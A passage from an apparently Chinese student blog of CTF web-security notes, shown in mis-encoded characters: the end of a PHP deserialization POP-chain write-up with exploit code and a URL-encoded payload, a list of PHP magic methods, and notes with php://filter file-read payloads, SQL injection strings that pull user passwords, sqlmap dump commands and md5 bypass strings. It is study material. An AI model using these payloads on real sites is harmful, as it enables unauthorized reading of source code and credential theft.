<p><code>__get()</code>æ–¹æ³•å°†pä½œä¸ºå‡½æ•°ä½¿ç”¨&#xff0c;på®ä¾‹åŒ–ä¸º<code>Modify</code>ç±»&#xff0c;å°±è°ƒç”¨äº†Modifierçš„<code>__invoke()</code>æ–¹æ³•&#xff1b;<br> <code>__invoke()</code>è°ƒç”¨äº†<code>append()</code>æ–¹æ³•&#xff0c;åŒ…å«<code>$value</code>&#xff0c;è‹¥å°†<code>$value</code>ä¸ºä¼ªåè®®&#xff0c;åˆ™å¯è¯»flag.phpæºç </p> <p></p>
<p>æ„é€ POPé“¾:/p>

</p><p>$a = new Show();<br>$a-&gt;source = new Show();<br>$a-&gt;source-&gt;str-&gt;p = new Modifier();</p>
<p>echo urlencode(serialize($a));</p>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">&#61;</span><span class="token double-quoted-string string">&#34;php://filter/read&#61;convert.base64-encode/resource&#61;flag.php&#34;</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>


<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span> <span class="token operator">&#61;</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token variable">$a</span> <span class="token operator">&#61;</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">&#61;</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">p</span> <span class="token operator">&#61;</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?&gt;</span>
</code></pre>

<p>è¿è¡Œå¾—åˆ°payload<br><img src="/2021/03/30/pop/1.png"><br>p:<br><code style="color:blue">?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BN%3B%7D%7D<br></code><br>å¾—åˆ°base64ç¼–ç ï¼Œè§£å¯†å¾—åˆ°flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-fxl" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/03/25/fxl/" class="article-date">
      <time datetime="2021-03-25T08:03:50.000Z" itemprop="datePublished">2021-03-25</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/03/25/fxl/">phpååºåˆ—åŒ–---&gt;é­”æ³•å‡½æ•°</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>è¿™å‘¨ï¼Œå‡ºäº†åˆ°webé¢˜ï¼Œååºåˆ—åŒ–é­”æ³•å‡½æ•°ï¼Œemmmé¢˜æˆ‘æ˜¯æ²¡åšå‡ºæ¥ï¼ˆåˆ«é—®ï¼Œé—®å°±æ˜¯æˆ‘æ˜¯åºŸç‰©wuwuwuwu~ï¼‰ï¼Œä½†æˆ‘æ€»ç»“äº†ç›¸å…³çŸ¥è¯†ç‚¹ï¼Œå‡ä»¥æ—¶æ—¥ï¼Œä½†æ„¿æ€»ç»“ç€ç»ˆç»“ç€æˆ‘å°±ä¼šäº†</p>
<h3>æ­£æ–‡</h3>

<p><font size="4"><b style="color:pink">é­”æ³•å‡½æ•°å®ä¾‹</b></font><br>PHPç±»ä¸­æœ‰ä¸€ç§ç‰¹æ®Šå‡½æ•°ä½“çš„å­˜åœ¨å«é­”æ³•å‡½æ•°ï¼Œmagicå‡½æ•°å‘½åæ˜¯ä»¥ç¬¦å·__å¼€å¤´çš„ï¼Œå¦‚ï¼š</p>
<ul>
<li>__construct()  å…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³• (æ„é€ å‡½æ•°)
</li><li>__destruct() ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚(ææ„å‡½æ•°)
</li><li>__call() åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__call() ä¼šè¢«è°ƒç”¨
</li><li>__callStatic() åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__callStatic() ä¼šè¢«è°ƒç”¨ã€‚
</li><li>__get() è¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ__get() ä¼šè¢«è°ƒç”¨ã€‚
</li><li>__set() åœ¨ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ__set() ä¼šè¢«è°ƒç”¨ã€‚
</li><li>__isset() å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ isset() æˆ– empty() æ—¶ï¼Œ__isset() ä¼šè¢«è°ƒç”¨ã€‚
</li><li>__unset() å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨ unset() æ—¶ï¼Œ__unset() ä¼šè¢«è°ƒç”¨ã€‚
</li><li>__sleep() å½“å¯¹è±¡è¢«serialize() å‡½æ•°å¤„ç†å‰ï¼Œè°ƒç”¨
</li><li>__wakeup() å½“ç±»è¢«unserialize()æ—¶è°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚
</li><li>__toString() è¯¥æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”
</li><li>__invoke()  å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨
</li><li>__set_state()
</li><li>__clone() å½“å¤åˆ¶å®Œæˆæ—¶ï¼Œå¦‚æœå®šä¹‰äº† __clone() æ–¹æ³•ï¼Œåˆ™æ–°åˆ›å»ºçš„å¯¹è±¡ï¼ˆå¤åˆ¶ç”Ÿæˆçš„å¯¹è±¡ï¼‰ä¸­çš„ __clone() æ–¹æ³•ä¼šè¢«è°ƒç”¨ï¼Œå¯ç”¨äºä¿®æ”¹å±æ€§çš„å€¼
</li><li>__debugInfo()  æ­¤æ–¹æ³•ç”±var_dumpï¼ˆï¼‰è°ƒç”¨

</li></ul>

<p><b>è¿™äº›å‡½æ•°åœ¨æŸäº›æƒ…å†µä¸‹ä¼šè‡ªåŠ¨è°ƒç”¨</b><br><font size="5"><b style="color:blue">â‘ æ„é€ å‡½æ•°â˜ __construct()</b></font><br><b>ä½œç”¨ï¼š </b>é€šå¸¸ç”¨äºåˆå§‹åŒ–å¯¹è±¡çš„å±æ€§<br><b>è‡ªåŠ¨è°ƒç”¨ä¸ï¼š </b>å¯¹è±¡åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨<br><img src="/2021/03/25/fxl/1.png"><br><font size="5"><b style="color:blue">â‘¡ææ„å‡½æ•°â˜ __destruct()</b></font><br>è‡ªåŠ¨è°ƒç”¨ä¸ï¼š å½“å¯¹è±¡ç»“æŸå…¶ç”Ÿå‘½å‘¨æœŸæ—¶ï¼ˆä¾‹å¦‚å¯¹è±¡æ‰€åœ¨çš„å‡½æ•°å·²è°ƒç”¨å®Œæ¯•ï¼‰ï¼Œç³»ç»Ÿè‡ªåŠ¨æ‰§è¡Œææ„å‡½æ•°ã€‚<br>ææ„å‡½æ•°æ— å‚æ•°<br>egï¼šä¸€ä¸ªå®åˆ—<br><img src="/2021/03/25/fxl/2.png"><br>å½“å‰å¯¹è±¡çš„nameå±æ€§ä¸º:is A<br>.<br>â€”-é”€æ¯å¯¹è±¡åâ€”-<br>å½“å‰å¯¹è±¡å·²è¢«é”€æ¯<br><font size="5"><b style="color:blue">â‘¢å¯¹å¯¹è±¡çš„å°è£…æ—¶çš„é­”æ³•å‡½æ•°</b></font><br>//__get() å¤–éƒ¨è®¿é—®ä¸å­˜åœ¨æˆ–è€…=ç§æœ‰å±æ€§æ—¶è°ƒç”¨<br>//__set() å¤–éƒ¨è®¿é—®ä¸å­˜åœ¨æˆ–è€…=ç§æœ‰å±æ€§æ—¶è°ƒç”¨<br>//__isset() åœ¨å¤–éƒ¨æ£€æµ‹æ˜¯å¦å­˜åœ¨æŸä¸ªå±æ€§æ—¶è°ƒç”¨<br>//__unset() å¤–éƒ¨é”€æ¯æŸä¸ªç§æœ‰å±æ€§æ—¶è°ƒç”¨æ—¶è°ƒç”¨<br><font size="5"><b style="color:blue">â‘£åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„é­”æ³•å‡½æ•°</b></font><br><b>__sleep()</b><br>è‡ªåŠ¨è°ƒç”¨æ—¶æœºï¼šåºåˆ—åŒ–æ—¶<br>ä½œç”¨ï¼šå°†å…è®¸åºåˆ—åŒ–çš„å¯¹è±¡æ”¾åœ¨ä¸€ç»„æ•°ç»„ä¸­è¿”å›ï¼Œåºåˆ—åŒ–æ—¶åªåºåˆ—åŒ–æŒ‡å®šçš„å±æ€§ã€‚<br><img src="/2021/03/25/fxl/3.png"><br><img src="/2021/03/25/fxl/4.png"><br><b>__wakeup()</b><br>è‡ªåŠ¨è°ƒç”¨æ—¶æœºï¼šååºåˆ—åŒ–æ—¶<br>ä½œç”¨ï¼šååºåˆ—åŒ–æ—¶ä¿®æ”¹å±æ€§ï¼ˆå¯¹é‡æ–°ç”Ÿæˆçš„å¯¹è±¡çš„å±æ€§è¿›è¡Œä¿®æ”¹ï¼‰ï¼Œæˆ–é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚<br>ä¾‹1 ï¼š<br><img src="/2021/03/25/fxl/5.png"><br><img src="/2021/03/25/fxl/6.png"><br>ä¾‹2 é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥<br><img src="/2021/03/25/fxl/7.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-gj" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/03/20/gj/" class="article-date">
      <time datetime="2021-03-20T12:41:26.000Z" itemprop="datePublished">2021-03-20</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/03/20/gj/">webæ­¥éª¤</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><b style="color:pink">1. çœ‹æºç </b></p>
<p>å¯ä»¥å³é”®-&gt;ã€æŸ¥çœ‹ç½‘é¡µæºä»£ç ã€‘ï¼Œä¹Ÿå¯ä»¥ç”¨ç«ç‹å’Œè°·æ­Œæµè§ˆå™¨çš„æŒ‰F12é”®ï¼ŒæŒ‰F12é”®å¯ä»¥ä¿®æ”¹htmlæºä»£ç æ–¹ä¾¿æ„é€ ä¸€äº›å€¼æäº¤ï¼Œä½†å¦‚æœä¸éœ€è¦çš„è¯ç›´æ¥å³é”®æŸ¥çœ‹æºä»£ç æ›´ç›´è§‚ï¼Œçœ‹ç½‘é¡µé‡Œé¢çš„æ³¨é‡Šä¹‹ç±»çš„éƒ½å¾ˆæ–¹ä¾¿ã€‚</p>
<p><b style="color:pink">2. æŠ“åŒ…&lt;/b.&gt;</b></p>
<p>è¿™å‡ å¤©æ¥è§¦åˆ°çš„æŠ“åŒ…ä¸€èˆ¬æ˜¯ç”¨burpsuiteï¼Œå¦‚æœè¦å¤šæ¬¡å°è¯•å¯ä»¥å³é”®-&gt;ã€send to Repeaterã€‘ï¼Œå¦‚æœè¦å¯¹æŸä¸ªå­—æ®µçˆ†ç ´å¯ä»¥å³é”®-&gt;ã€send to Intruderã€‘ï¼Œè¿™æ˜¯æˆ‘æ¯”è¾ƒå¸¸ç”¨çš„ä¸¤ç§burpsuiteçš„åŠŸèƒ½ã€‚</p>
<p>ä»Šå¤©è¿˜æ¥è§¦åˆ°è°·æ­Œæµè§ˆå™¨ï¼šF12-&gt;Network-&gt;å‹¾é€‰ã€Preserve logã€‘ï¼Œä¹Ÿå¯ä»¥æ–¹ä¾¿æŸ¥çœ‹è¯·æ±‚åŒ…å’Œå“åº”åŒ…çš„æ•°æ®ï¼ˆåŒ…å¤´å­—æ®µå’Œç½‘é¡µæ•°æ®ç­‰ï¼‰ã€‚</p>
<p><b style="color:pink">3. å…³æ³¨çš„å‡ ä¸ªåœ°æ–¹</b></p>
<p>æœ‰æ—¶å€™æ‰“å¼€ç½‘é¡µåæ„Ÿè§‰æ²¡æœ‰å¯ç–‘çš„åœ°æ–¹ï¼Œé¦–å…ˆæŸ¥çœ‹ä¸‹æºä»£ç ï¼Œçœ‹æœ‰æ²¡æœ‰æ³¨é‡Šä¹‹ç±»çš„æç¤ºä¿¡æ¯ï¼Œä¹‹åé‡æ–°æ‰“å¼€ç½‘é¡µï¼ŒæŠ“æŠ“åŒ…çœ‹ä¸‹è¯·æ±‚åŒ…å“åº”åŒ…çš„åŒ…å¤´æ•°æ®æœ‰æ²¡æœ‰å¯ç–‘çš„åœ°æ–¹ã€‚</p>
<p><b style="color:pink">4. includeæ¼æ´</b></p>
<p>é‡åˆ°phpä»£ç ä¸­æœ‰include($file)çš„ï¼Œä¸€èˆ¬å’Œ php://inputæˆ–è€…php://filteræœ‰å…³ï¼Œ$fileå€¼å¦‚æœæ˜¯php://inputï¼Œå°±è¦ç”¨postè¡¨å•æ„é€ æ•°æ®ï¼Œå¦‚æœæ˜¯php://filterï¼Œå°±ç”¨ä¸‹é¢çš„payloadè¯»å–æ–‡ä»¶base64åŠ å¯†åçš„æºä»£ç ï¼Œè§£å¯†åæŸ¥çœ‹æºä»£ç ã€‚</p>
<p>PHP://filter/read=convert.base64-encode/resource=æ–‡ä»¶å(å¦‚index.php)
Â </p>
<p><b style="color:pink">5. ä»£ç å®¡è®¡</b></p>
<p>éœ€è¦å¤šæ¬¡åŠ¨æ€è°ƒè¯•æ¥å°è¯•ï¼Œä»¥åŠè¦å…³æ³¨é‡Œé¢å‡ºç°çš„å‡½æ•°ï¼Œå‡ºç°åœ¨å…³é”®ä½ç½®çš„å‡½æ•°ä¸€èˆ¬éƒ½æ˜¯æœ‰ç”¨çš„ï¼Œæœç´¢ä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸å…³çš„æ¼æ´ã€‚</p>
<p>è¿˜æœ‰ä¸€äº›å’Œæ•°æ®å¤„ç†æœ‰å…³çš„ç»•è¿‡ï¼Œå¦‚md5å‡½æ•°ç»“æœç›¸ç­‰ï¼ˆ0ed+ï¼‰çš„æ¯”è¾ƒï¼Œä»¥åŠstrcmp(array,string)=nullï¼Œé™¤äº†é‡åˆ°æ—¶å¤šç™¾åº¦ä¹‹å¤–ï¼Œå¹³æ—¶ä¹Ÿéœ€è¦å¤šç§¯ç´¯åˆ°æ—¶å€™æ‰èƒ½æƒ³åˆ°ã€‚</p>
<p>è¿˜æœ‰GETå‚æ•°æ„é€ çš„æ—¶å€™å¦‚æœä¼ å…¥çš„æ˜¯æ•°ç»„è¦è®°å¾—åŠ []ï¼Œï¼Ÿtxt[]=[1,2,3]ï¼Œå¦‚æœå¡«?txt=[1,2,3]ä¼¼ä¹ä¸ä¼šè¢«å½“åšarrayå¤„ç†ã€‚</p>
<p><b style="color:pink">6.ç¼–ç </b></p>
<p>JSçš„å‡ ç§ç¼–ç ï¼ˆå¦‚JSFUCKï¼‰éƒ½å¯ä»¥åœ¨æµè§ˆå™¨F12ä¹‹åçš„æ§åˆ¶å°æ‰§è¡Œï¼Œè¿™æ ·å¯ä»¥çœå»æ‰¾è§£å¯†ç½‘ç«™çš„æ—¶é—´ã€‚</p>
<p>htmlç¼–ç ï¼Œbase64ç¼–ç ï¼Œurlç¼–ç ç­‰ç­‰éƒ½å¯ä»¥åœ¨burpsuiteä¸Šçš„decoderæ è§£å†³ï¼Œä½†æ˜¯å‘ç°burpsuiteæœ‰ä¸€ç‚¹ä¸å¥½å°±æ˜¯ä¸­æ–‡ä¸èƒ½æ˜¾ç¤ºï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å­—ç¬¦ç¼–ç æ²¡æœ‰é…ç½®å¥½ï¼Œæ‰¾åˆ°ä¸€ä¸ªç½‘å€ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://emn178.github.io/online-tools/base64_decode.html">https://emn178.github.io/online-tools/base64_decode.html</a></p>
<p>å¯ä»¥è§£å¥½å‡ ç§ï¼Œç•Œé¢ä¹Ÿå¾ˆç®€æ´ã€‚</p>
<p><b style="color:pink">7.SQLæ³¨å…¥</b></p>
<p>æœ€è¿‘ææ¸…æ¥šäº†å¸ƒå°”æ³¨å…¥ï¼Œç›²æ³¨ä¹‹ç±»çš„æ„æ€ï¼Œå¸ƒå°”æ³¨å…¥å°±åƒä¸€ä¸ªåªä¼šå‘Šè¯‰ä½ å¯¹æˆ–é”™çš„æœºå™¨äººï¼Œç„¶åä½ å»é—®ä»–é—®é¢˜ä»è€Œè§£å†³é—®é¢˜ï¼Œç›²æ³¨æ˜¯è¯´ä¸ä¼šæœ‰æç¤ºä¿¡æ¯ï¼Œè™½ç„¶å¯¹æ•°æ®åº“çš„æ“ä½œä¾ç„¶å­˜åœ¨ï¼Œä½†æ˜¯ä¸è®ºæ˜¯å¦æ“ä½œæˆåŠŸéƒ½ä¸ä¼šå‘Šè¯‰ä½ ã€‚</p>
<p>a&gt;å¯¹ä¸€ä¸ªæ³¨å…¥è¯­å¥è®°ä¸ªç¬”è®°ï¼š</p>
<p>%dfâ€™ union select 1,database() %23 %dfâ€™ union select 1,string from sql5.key %23</p>
<p>%dfæ˜¯åœ¨ç¼–ç ä¸ºgbkçš„æ—¶å€™ç”¨äºå®½å­—èŠ‚æ³¨å…¥çš„ï¼›%23å°±æ˜¯#ï¼Œä½†æ˜¯ç”¨#ä¸èƒ½é€šè¿‡ï¼›è¿˜æœ‰å¯ä»¥ç›´æ¥ç”¨ union select å­—æ®µå from æ•°æ®åº“å.è¡¨å çš„æ–¹å¼è·å–å­—æ®µçš„å€¼ã€‚</p>
<p>b&gt;å¯¹ç”¨sqlmapè¿›è¡Œæ‰‹å·¥æ³¨å…¥çš„ä¸€äº›æ­¥éª¤è®°ä¸ªç¬”è®°é¦–å…ˆæ‰¾åˆ°å¯ä»¥æ³¨å…¥çš„ç‚¹ï¼Œæ¯”å¦‚æ‰¾åˆ°ç½‘é¡µçš„æŸä¸ªåŠ¨æ€é¡µé¢æ˜¯å¯ä»¥æ³¨å…¥ç”¨æ¥æ˜¾ç¤ºä¿¡æ¯çš„ï¼Œç„¶åå°†è¿™ä¸ªurlç”¨sqlmapæ¥æš´åº“çˆ†è¡¨ã€‚</p>
<p>python sqlmap.py -u â€œurlâ€ â€“level 3 â€“batch â€“dbs python sqlmap.py -u â€œurlâ€ â€“level 3 â€“batch -D ctf â€“tables python sqlmap.py -u â€œurlâ€ â€“level 3 â€“batch -D ctf -T flag â€“columns â€“dump</p>
<p>â€“batch sqlmapä¸ä¼šè¯¢é—®ä½ è¾“å…¥ å…¨éƒ¨é»˜è®¤ç¡®å®š</p>
<p>â€“level 3 æŒ‡å®šç­‰çº§ï¼Œå¤§äºç­‰äº3çš„æ—¶å€™ä¼šæ¶‰åŠåˆ°httpå¤´æ³¨å…¥çš„Refererå­—æ®µ</p>
<p>â€“ï¼ˆä¸¤ä¸ª-ï¼‰ç¬¦å·ç”¨äºæŸ¥è¯¢ï¼Œæ¯”å¦‚â€“dbsç”¨äºæŸ¥è¯¢æ‰€æœ‰çš„æ•°æ®åº“ï¼Œâ€“tablesç”¨äºæŸ¥è¯¢æ‰€æœ‰çš„è¡¨ï¼Œ-ï¼ˆä¸€ä¸ª-ï¼‰ç¬¦å·ç”¨äºæŒ‡å®šï¼Œæ¯”å¦‚-D ctfç”¨äºæŒ‡å®šæŸ¥è¯¢çš„æ˜¯ctfæ•°æ®åº“ï¼Œ-T flagç”¨äºæŒ‡å®šæŸ¥è¯¢çš„æ˜¯flagè¡¨ï¼Œâ€“dumpå¯ä»¥ç”¨æ¥å°†è¡¨ä¸­å­—æ®µçš„å€¼æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<p>c&gt;è¿˜æœ‰ä¸€äº›ç”¨union selectæ¥è·å¾—æ•°æ®åº“ä¿¡æ¯çš„ï¼Œé“¾æ¥</p>
<p><a target="_blank" rel="noopener" href="http://www.2cto.com/article/201208/151503.html">http://www.2cto.com/article/201208/151503.html</a></p>
<p>è®²å¾—å¾ˆå…¨é¢ã€‚</p>
<ol>
<li><p>@@version() MYSQLç‰ˆæœ¬ </p>
</li>
<li><p>@@database() å½“å‰æ•°æ®åº“ </p>
</li>
<li><p>@@user() å½“å‰ç”¨æˆ· </p>
</li>
<li><p>@@datadir å½“å‰æ•°æ®åº“è·¯å¾„ </p>
</li>
<li><p>@@version_compile_os æ“ä½œç³»ç»Ÿç‰ˆæœ¬</p>
</li>
<li><p>concat(str1,str2,â€¦) æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸² </p>
</li>
<li><p>concat_ws(separator,str1,str2,â€¦) ç”¨åˆ†éš”ç¬¦è¿æ¥å­—ç¬¦ä¸² </p>
</li>
<li><p>group_concat(str1,str2,â€¦) ç”¨é€—å·åˆ†éš”å­—ç¬¦ä¸²</p>
</li>
<li><p>æŸ¥æ•°æ®åº“åï¼Œç”¨æˆ·å<br>union select 1,2,concat(user(),database(),version()),4,â€¦â€¦,N â€“<br>ï¼ˆæœ€åâ€“ç”¨äºæ³¨é‡Šæ‰åé¢sqlè¯­å¥é¿å…å‡ºé”™ï¼‰å¾—åˆ°æ•°æ®åº“å </p>
</li>
<li><p>æŸ¥è¡¨åï¼š union select group_concat(0x0a,table_name),2<br>from information_schema.tables<br>where table_schema=åº“ååå…­è¿›åˆ¶#<br>ï¼ˆåº“ååå…­è¿›åˆ¶å¯ä»¥ç”¨database()ä»£æ›¿ï¼‰ </p>
</li>
<li><p>æŸ¥åˆ—å union select group_concat(0x0a,column_name)<br>,2 from information_schema.columns<br>where table_schema=database() and table_name=â€™usersâ€™# ï¼ˆ<br>ä¹Ÿå¯ä»¥æŠŠè¡¨åæ”¹ä¸ºåå…­è¿›åˆ¶ç¼–ç 0x7573657273ï¼‰ </p>
</li>
<li><p>æŸ¥éœ€è¦çš„ä¿¡æ¯ï¼ˆç”¨æˆ·åå’Œå¯†ç ï¼‰<br>union select group_concat(distinct 0x0a,user_id,0x0a,first_name,0x0a,<br>last_name,0x0a,user,0x0a,password,0x0a),<br>2 from users #</p>
</li>
</ol>
<p>æ€»ç»“çš„éƒ½æ¯”è¾ƒæ•£ç¢ä¹Ÿæ¯”è¾ƒåŸºç¡€ï¼Œä»¥åç§¯ç´¯çš„å¤šäº†ä¸€äº›ä¹‹åå†æ¥ç»§ç»­è¡¥å……ã€‚</p>
<p>&lt;Â  ç”¨è¿™ä¸ªè¡¨ç¤º\u003cÂ  Â  Â &gt;ç”¨è¿™ä¸ªè¡¨ç¤º \u003eÂ </p>
<p>Â <br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/youyoui/p/8610068.html">https://www.cnblogs.com/youyoui/p/8610068.html</a> åºåˆ—åŒ–</p>
<p>1ã€å½“åœ¨ä¸€ä¸ªç½‘é¡µä¸Šæ‰¾ä¸åˆ°ä»»ä½•ä¿¡æ¯æ—¶ï¼Œè¦æŸ¥çœ‹ä»–æœ‰æ²¡æœ‰robots.txt æˆ–è€…å‰é¢çš„å¤‡ä»½æ–‡ä»¶</p>
<p>2ã€extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚é€šä¿—çš„è®² å°±æ˜¯å¯ä»¥å°†é”®å˜æˆå˜é‡åï¼Œé”®å€¼å¯ä»¥å˜æˆå˜é‡åçš„å€¼</p>
<p>sha1ï¼ˆï¼‰å’Œmd5ï¼ˆï¼‰éƒ½å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ è€Œmd5åŠ å¯†ååˆ¤æ–­ç›¸ç­‰æ—¶åªè¦æ˜¯0eå­—ç¬¦ä¸²éƒ½ä¼šè¿”å›true</p>
<p>QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904</p>
<p>3ã€file_get_contentsï¼ˆï¼‰ å¯ä»¥ä½¿ç”¨php://inputä¼ è¿‡å» å†ç”¨postæ„å»ºå…¶é‡Œé¢çš„å†…å®¹</p>
<p>include() å¯ä»¥ä½¿ç”¨</p>
<p>PHP://filter/read=convert.base64-encode/resource=æ–‡ä»¶å(å¦‚index.php) ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸Šè¿°çš„æ–¹æ³•ã€‚
Â </p>
<p>sql md5</p>
<p>çœ‹åˆ°è¿™é‡Œçš„æäº¤å‚æ•°è¢«MD5å†ç»„åˆè¿›SQLæŸ¥è¯¢è¯­å¥ï¼Œå¯¼è‡´å¸¸è§„çš„æ³¨å…¥æ‰‹æ®µå‡ ä¹éƒ½å¤±æ•ˆäº†</p>
<p>ä½†æ˜¯æ³¨æ„åˆ°ï¼ŒMD5ä¹‹åæ˜¯hexæ ¼å¼ï¼Œè½¬åŒ–åˆ°å­—ç¬¦ä¸²æ—¶å¦‚æœå‡ºç°â€™orâ€™xxxxçš„å½¢å¼ï¼Œå°±ä¼šå¯¼è‡´æ³¨å…¥</p>
<p>è¿™é‡Œæä¾›ä¸€ä¸ªæŠ„æ¥çš„å­—ç¬¦ä¸²ï¼šffifdyop</p>
<p>md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c</p>
<p>è½¬æˆå­—ç¬¦ä¸²ä¸ºâ€™orâ€™6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b</p>
<p>ä»è€Œå®Œæˆäº†æ³¨å…¥</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-zj" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/03/18/zj/" class="article-date">
      <time datetime="2021-03-18T12:48:43.000Z" itemprop="datePublished">2021-03-18</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/03/18/zj/">CSRF</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
